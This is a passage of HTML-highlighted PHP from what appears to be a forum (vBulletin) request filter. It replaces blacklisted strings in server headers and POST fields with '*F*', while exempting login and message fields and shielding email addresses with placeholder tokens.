#007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_PRAGMA"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$cache_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_PRAGMA"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$cache_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_CACHE_CONTROL"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$cache_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_CACHE_CONTROL"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$cache_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_CACHE_CONTROL"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /></span><span style="color: #0000BB">$req_deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">array_diff</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">,&nbsp;array(</span><span style="color: #DD0000">"/"</span><span style="color: #007700">,</span><span style="color: #DD0000">"."</span><span style="color: #007700">));<br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$req_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"SERVER_PROTOCOL"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$req_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"SERVER_PROTOCOL"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$req_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"SERVER_PROTOCOL"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"reqtype"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"reqtype"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"reqtype"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /><br /><br /></span><span style="color: #0000BB">$fields&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">'customtext'</span><span style="color: #007700">,</span><span style="color: #DD0000">'homepage'</span><span style="color: #007700">,</span><span style="color: #DD0000">'bccrecipients'</span><span style="color: #007700">,</span><span style="color: #DD0000">'recipients'</span><span style="color: #007700">,</span><span style="color: #DD0000">'message_backup'</span><span style="color: #007700">,</span><span style="color: #DD0000">'title'</span><span style="color: #007700">,</span><span style="color: #DD0000">'forward'</span><span style="color: #007700">,</span><span style="color: #DD0000">'securitytoken'</span><span style="color: #007700">,</span><span style="color: #DD0000">'url'</span><span style="color: #007700">,</span><span style="color: #DD0000">'username'</span><span style="color: #007700">,</span><span style="color: #DD0000">'vb_login_username'</span><span style="color: #007700">,</span><span style="color: #DD0000">'vb_login_password'</span><span style="color: #007700">,</span><span style="color: #DD0000">'vb_login_password_hint'</span><span style="color: #007700">,</span><span style="color: #DD0000">'confirm'</span><span style="color: #007700">,</span><span style="color: #DD0000">'message'</span><span style="color: #007700">,</span><span style="color: #DD0000">'message_backup'</span><span style="color: #007700">,</span><span style="color: #DD0000">'sbutton'</span><span style="color: #007700">,</span><span style="color: #DD0000">'passwordconfirm'</span><span style="color: #007700">,</span><span style="color: #DD0000">'postvars'</span><span style="color: #007700">);<br /><br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'securitytoken'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'securitytoken'</span><span style="color: #007700">&#93;);<br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /><br /><br /><br /><br />foreach(</span><span style="color: #0000BB">$_POST&nbsp;</span><span style="color: #007700">as&nbsp;</span><span style="color: #0000BB">$key&nbsp;</span><span style="color: #007700">=&gt;&nbsp;</span><span style="color: #0000BB">$value</span><span style="color: #007700">){<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$key&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$key</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$value&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$value</span><span style="color: #007700">);<br />&nbsp;&nbsp;for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$value</span><span style="color: #007700">,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(</span><span style="color: #0000BB">$j</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$j</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$fields</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$j</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$key</span><span style="color: #007700">,</span><span style="color: #0000BB">$fields</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$j</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_POST&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br />}<br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'email'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'emailconfirm'</span><span style="color: #007700">&#93;);<br /><br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'securitytoken'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'securitytoken'</span><span style="color: #007700">&#93;);<br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'yahoo'</span><span style="color: #007700">&#93;);<br /><br /><br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ1"</span><span style="color: #007700">,</span><span style="color: #DD0000">"@"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ2"</span><span style="color: #007700">,</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">"ZZZZ3"</span><span style="color: #007700">,</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /></span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span 